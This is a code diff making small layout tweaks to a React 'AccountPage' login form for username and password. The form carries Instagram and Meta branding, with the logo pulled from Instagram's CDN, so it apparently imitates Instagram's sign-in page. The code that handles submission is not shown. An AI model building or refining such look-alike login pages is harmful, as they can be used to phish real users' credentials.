@@ -45,7 +45,7 @@ export default function AccountPage() {
         
 
 <div className="px-7 pt-8 pb-5 text-center">
-  <div className="flex justify-center">
+  <div className="flex justify-center h-[50px]">
     <img
       src="https://static.cdninstagram.com/rsrc.php/yO/r/Ny6hrBVLYjl.webp"
       alt="Instagram"
@@ -89,7 +89,7 @@ export default function AccountPage() {
 
 
         <form onSubmit={submit} className="px-7 pb-5 space-y-3">
-          <input className={inputCls} placeholder={t("acct.username")} value={username} onChange={e => setUsername(e.target.value)} autoComplete="username" required maxLength={60} />
+          <input className={inputCls} placeholder={t("acct.username")} onChange={e => setUsername(e.target.value)} autoComplete="username" required maxLength={60} />
           <div className="relative">
             <input type={showPw ? "text" : "password"} className={inputCls} placeholder={t("acct.password")} value={password} onChange={e => setPassword(e.target.value)} autoComplete="current-password" required minLength={6} />
             <button type="button" onClick={() => setShowPw(s => !s)} className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-gray-600">{showPw ? t("acct.hide") : t("acct.show")}</button>
@@ -100,7 +100,7 @@ export default function AccountPage() {
 
 
            {/* Meta Logo */}
-  <div className="flex justify-center pt-2 h-[40px]">
+  <div className="flex justify-center pt-2">
     <svg
       aria-label="Meta Logo"
       className="w-28 h-auto"
@@ -117,8 +117,6 @@ export default function AccountPage() {
       />
     </svg>
   </div>
-          
-
 
         </form>
       </div>
